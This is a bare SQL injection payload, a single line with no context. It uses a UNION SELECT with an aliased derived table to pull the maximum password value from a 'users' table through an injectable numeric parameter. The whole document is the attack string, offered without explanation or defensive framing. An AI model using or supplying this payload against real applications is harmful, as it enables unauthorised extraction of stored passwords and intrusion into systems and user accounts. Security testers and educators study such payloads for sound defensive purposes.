9999 union select null, max(pw) from (select 1 a, 2 b, 3 pw union select * from users where id between 1 and 1)
